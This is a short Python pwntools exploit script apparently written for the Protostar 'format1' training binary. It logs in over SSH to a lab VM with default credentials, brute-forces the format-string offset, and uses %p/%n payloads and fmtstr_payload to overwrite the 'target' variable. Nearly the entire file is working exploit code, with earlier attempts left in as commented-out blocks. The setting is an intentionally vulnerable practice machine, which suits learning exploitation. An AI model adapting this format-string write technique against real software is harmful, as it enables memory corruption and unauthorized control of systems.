#!/usr/bin/env python3
from pwn import *
context.update(arch='i386', os='linux')
context.bits =32


'''
user@protostar:/opt/protostar/bin$ nm ./format1 | grep target
08049638 B target
'''
egg = 'AAAA'
value = 1

s = ssh(host='192.168.12.128', user='user', password='user')
'''
i = 1
while i < 200:
    c = int(i)
    payload = egg + '%p'*c+'%p'
    s.upload_data(payload, '/tmp/payload')
    sh = s.run('/opt/protostar/bin/format1 $(cat /tmp/payload)')
    result = sh.recvS()
    if '41414141' in result:
        print(i)
        break
    i += 1
'''

egg = 0x08049638
offset = 127

'''
payload = p32(egg) 
payload += (b'%p'*offset)
payload += b'%n'
s.upload_data(payload, '/tmp/payload')
sh = s.run('/opt/protostar/bin/format1 $(cat /tmp/payload)')
result = sh.recvS()
print(result)
'''

def findOffset():
    result = ''
    dst = 0xdeadbeef
    val = 0x1
    bingo = 'you have modified'

    s = ssh(host='192.168.12.128', user='user', password='user')
    for offset in range(0, 200):
        for bytesWritten in range(0, 200):
            payload = fmtstr_payload(offset, {egg: val}, write_size='byte', numbwritten=bytesWritten)
            s.upload_data(payload, '/tmp/payload')
            sh = s.run('/opt/protostar/bin/format1 $(cat /tmp/payload)')
            result = sh.recvS()
            if bingo in result:
                print( 'bytesWritten', bytesWritten,'offset' , offset, ':', result)
                return
    s.close()

payload = fmtstr_payload(129, {egg: 0x1}, write_size='byte', numbwritten=0)
print(str(payload))
s.upload_data(payload, '/tmp/payload')
sh = s.run('/opt/protostar/bin/format1 $(cat /tmp/payload)')
result = sh.recvS()
print(result)

